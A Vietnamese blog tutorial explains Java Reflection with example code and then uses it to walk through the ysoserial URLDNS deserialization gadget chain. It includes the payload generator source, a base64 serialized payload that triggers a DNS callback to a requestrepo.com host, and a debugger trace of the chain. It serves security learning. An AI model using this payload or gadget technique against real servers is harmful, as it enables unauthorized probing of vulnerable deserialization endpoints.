---
title: Lỗ hổng Java Deserialization - Phần 2 - Java Reflection
date: 2023-09-13 12:00:00 +0700
categories: [Java]
tags: [deserialization]     # TAG names should always be lowercase
img_path: /assets/img/JavaDeserializationP2
---

## Java Reflection là gì?
`Reflection` là 1 API trên Java sử dụng để truy xuất, sửa đổi hành vi của fields, methods, classes, interfaces trong quá trình runtime. Điều này đặc biệt hữu ích khi không biết tên chúng tại thời điểm compile hay do server filter 1 số thứ.<br>

![reflection](reflection.jpg)

Ngoài ra, chúng ta có thể khởi tạo object mới, gọi các method hay set các giá trị các fields từ reflection.

![invoke](invoke.png)

## Ví dụ
Vì JDK đi kèm với các class của package `java.lang.reflect` từ đó ta chỉ cần import nó để sử dụng Reflection:

```java
import java.lang.reflect.*;
```

Ta có class Person:
```java
public class Person {
    private String name;
    private int age;
    public Person(){}

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public void setName(String name) {
        this.name = name;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}
```

### Class object
Class **java.lang.Class (Class object)** là *entry point* của các thao tác reflection (hiểu nôm na là class này chứa các methods để sử dụng reflection như `getDeclaredMethods()`, `getDeclaredField()`,...) <br>
Và để lấy được `Class object` ta có thể sử dụng:
- `ClassName.class`, ví dụ: `Person.class`.
- `Class.forName(ClassName)`, ví dụ: `Class.forName("Person")`.
### Fields
Từ class `Person` trên ta tạo object và set giá trị:

```java
Person person = new Person();
person.setName("chuong");
person.setAge(19);
```

Ta sử dụng `getDeclaredFields()` để lấy về mảng các `Field`, `getName()` để lấy tên field và `getType()` để lấy kiểu dữ liệu của field đó:

```java
for(Field field : Person.class.getDeclaredFields()){
    String fieldName = field.getName();  
    System.out.println("Field: " + fieldName);
    System.out.println("Type: " +field.getType());
    field.setAccessible(true);
    System.out.println("Value:" + field.get(person));
    System.out.println("---------------");
}
```
Output:

![getfield](getfield.png)

Ở trên `get()` để lấy giá trị của object, và ta cũng có thể dùng `set()` để đặt các giá trị mong muốn cho field:

```java
Field nameField = Person.class.getDeclaredField("name");
nameField.setAccessible(true);
nameField.set(person, "admin");
System.out.println(person.toString());  // dùng toString() để kiểm tra
```
>`setAccessible(true)` để cấp quyền truy cập vào chúng (ở đây là field).

Output:

![setfield](setfield.png)

### Methods
Cũng tương tự như field:

```java
Method[] methods = Person.class.getDeclaredMethods();
for(Method method : methods){
    methodName =  method.getName();
    System.out.println("Method: " + methodName);
    System.out.println("Parameters: " + Arrays.toString(method.getParameters()));  // lấy ra mảng chứa param
}
```
Output:

![getmethod](getmethod.png)

#### Gọi method
Đây là một phần cũng hay được dùng đến, ta lấy ra method và gọi nó bằng `invoke()`:

```java
Method methodSetName = Person.class.getMethod("setName", String.class);  // lấy ra method setName()
Person person1 = new Person();
methodSetName.invoke(person1, "admin");
System.out.println(person1.toString());
```
Output:

![method](method.png)

>Ta cũng có thể gọi method constructor để tạo object.

### Constructor

```java
for(Constructor constructor : Class.forName("Person").getDeclaredConstructors()) {
    System.out.println("Name of Constructor : "+constructor);
    System.out.println(Arrays.toString(constructor.getParameters()));
    System.out.println("------------");
}
```
Ouptput:

![constructor](constructor.png)

#### Tạo object
Việc lấy ra constructor như vậy thì ta có thể từ đó tạo object mới mà không cần cách thông thường là dùng `new`:

```java
Class<Person> personClass = Person.class;
Constructor<Person> personConstructor = personClass.getConstructor(String.class, int.class);
Person person2 = personConstructor.newInstance("admin", 19);
System.out.println(person2.toString());
```
Output:

![constructor1](constructor1.png)

### Refs
- <https://loda.me/articles/huong-dan-java-reflection>
- <https://www.baeldung.com/java-reflection>
- <https://www.geeksforgeeks.org/reflection-in-java/>
- <https://tsublogs.wordpress.com/2023/02/15/javasecurity101-1-java-reflection/>
- <https://javasec.org/javase/Reflection/Reflection.html>

## Reflection trong lỗ hổng Java Deserialization
Như đã nói ở trên, việc có thể set được giá trị các fields hay invoke được các methods của object là điều quan trọng để thực hiện khai thác lỗ hổng Deserialization.
### Tạo payload và thực thi
Ví dụ sau đây sẽ là về chain URLDNS, đây là [src](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java) tạo payload:
```java
...
public class URLDNS implements ObjectPayload<Object> {
        public Object getObject(final String url) throws Exception {
                URLStreamHandler handler = new SilentURLStreamHandler();
                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url);
                Reflections.setFieldValue(u, "hashCode", -1);
                return ht;
        }
        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```
Bây giờ tạo payload từ [ysoserial](https://github.com/frohoff/ysoserial/tree/master):

![genpayload](genpayload.png)

Viết đoạn code Java để thực thi deserialize từ payload đó:
```java
import java.util.Base64;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

public class URLDNSTest {
    public static void main(String[] args) {
        String base64Payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAGGc5ems3NTR6LnJlcXVlc3RyZXBvLmNvbXQAAHEAfgAFdAAEaHR0cHB4dAAfaHR0cDovL2c5ems3NTR6LnJlcXVlc3RyZXBvLmNvbXg=";
        try {
            byte[] serializedData = Base64.getDecoder().decode(base64Payload);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serializedData));
            Object deserializedObject = ois.readObject();
            ois.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
Chạy thử chương trình và kết quả có request DNS đến URL chỉ định:

![requestdns](requestdns.png)

### Phân tích

**Gadget Chain**:
```
HashMap.readObject()
  ->HashMap.putVal()
    ->HashMap.hash()
      ->URL.hashCode()
```
Bắt đầu với `HashMap.readObject()`:

`Ctrl+N` để tìm và truy cập vào class `HashMap`:

![hashmapclass](hashmapclass.png)

`Ctrl+F12` để list hết method có trong class này và tìm đến `readObject()`:

![hmreadobj](hmreadobj.png)

>Method `readObject()` dùng để khởi tạo một object, Java cho phép ghi đè lên method này. Nếu một số class không có method `readObject()` thì nó sẽ dùng default method là `ObjectInputStream#readObject()`.
{: .prompt-tip }

Method tiếp theo được gọi là `HashMap.putVal()` vậy ta đặt breakpoint ở đây để debug:

![bp1](bp1.png)

Debug chương trình ta biết được:

![db1](db1.png)

`key` là URL object có thể hiện cho URL input lúc ta tạo payload.

Tiếp theo `putVal()` gọi đến method `hash()` của chính class hiện tại là `HashMap` với them số truyền vào là `key`. `F7` và đi vào xem `hash()` thực hiện gì:

![hmhash](hmhash.png)

Tại đây nếu `key` là `null` sẽ trả về giá trị `0` ngược lại ở đây `key.hashCode()` được thực thi mà `key` là URL object. Tiếp tục `F7` để nhày vào method `hashCode()` trong class `URL`:

![urlhashcode](urlhashcode.png)

Ở đây nếu `hashCode != -1` thì sẽ `return hashCode;`, và nếu vậy thì chain sẽ dừng tại đây. Vì vậy ta cần giá trị của `hashCode` bằng `-1`.

![hashcode](hashcode.png)

Để set private field như trên, ta cần sử dụng [Reflection](https://caodchuong312.github.io/posts/Java-Deserialization-P2/#fields) như trong payload đã dùng:
```java
...
Reflections.setFieldValue(u, "hashCode", -1);
```
Bây giờ `F7` tiếp:

![handler](handler.png)

`handler` là `URLStreamHandler` object:

![handler1](handler1.png)

>`transient` để đánh dấu field không được serialized.
{: .prompt-tip }

Đi vào method `hashCode()` của class `URLStreamHandler`:

![urlstreamer](urlstreamer.png)

Tại đây method `getHostAddress(u)` với `u` truyền vào là URL object là input tạo payload ban đầu.

![getHostAddress](getHostAddress.png)

Tiếp tục `F7`, cho đến khi gặp method `InetAddress.getByName()` với giá trị truyền vào là `host` lấy từ `u`. Đây là method thực hiện request DNS, điều này dễ nhận ra khi `F7` cho nó thực thi và rồi kiểm tra request nhận được.

Như vậy chain đầy đủ sẽ là:
```
HashMap.readObject()  [source]
  ->HashMap.putVal()
    ->HashMap.hash()
      ->URL.hashCode()
        ->URLStreamHandler.hashCode()
          ->URLStreamHandler.getHostAddress()
            ->InetAddress.getByName() [sink]
```
Trên đây là chain cơ bản nhất trong ysoserial.
### Tham khảo
- <https://sec.vnpt.vn/2020/02/co-gi-ben-trong-cac-gadgetchain/>
- <https://tsublogs.wordpress.com/2023/02/17/javasecurity101-4-java-deserialization-ysoserial-2/>
